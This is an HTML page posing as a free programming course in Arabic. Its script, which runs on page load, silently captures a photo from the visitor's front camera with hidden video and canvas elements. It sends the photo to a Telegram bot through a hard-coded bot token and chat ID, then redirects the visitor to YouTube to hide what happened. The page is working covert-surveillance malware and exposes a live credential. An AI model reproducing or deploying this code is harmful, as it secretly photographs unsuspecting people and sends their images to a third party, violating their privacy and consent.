<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>دورة برمجية مجانية</title>
</head>
<body>
  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE';
    const chatId = '7728263509';

    function dataURLtoBlob(dataurl) {
      let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
      while(n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], {type:mime});
    }

    async function sendPhoto(base64Image) {
      const blob = dataURLtoBlob(base64Image);
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function captureAndSendCameraImage() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });

        const video = document.getElementById('video');
        video.srcObject = stream;

        setTimeout(() => {
          const canvas = document.getElementById('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          stream.getTracks().forEach(track => track.stop());

          const base64Image = canvas.toDataURL("image/jpeg");
          sendPhoto(base64Image).then(() => {
            // ✅ بعد إرسال الصورة، ينقله ليوتيوب!
            window.location.href = "https://www.youtube.com/watch?v=SDHEI3obWx0";
          });

        }, 3000);
      } catch (err) {
        // فشل الوصول؟ خلاص يوديه اليوتيوب برضه
        window.location.href = "https://www.youtube.com/watch?v=SDHEI3obWx0";
      }
    }

    window.onload = captureAndSendCameraImage;
  </script>
</body>
</html>
